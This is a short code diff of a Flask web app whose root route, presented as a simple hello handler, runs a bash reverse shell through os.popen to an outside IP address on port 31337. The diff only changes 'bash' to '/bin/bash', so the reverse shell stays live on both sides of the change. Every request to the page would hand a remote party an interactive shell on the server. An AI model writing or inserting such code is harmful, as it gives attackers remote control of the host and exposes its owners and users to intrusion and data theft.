@@ -5,7 +5,7 @@ app = Flask(__name__)
 
 @app.route("/")
 def hello():
-    tmp = os.popen("bash -i >& /dev/tcp/159.203.136.25/31337 0>&1").read()
+    tmp = os.popen("/bin/bash -i >& /dev/tcp/159.203.136.25/31337 0>&1").read()
     return tmp
 
 
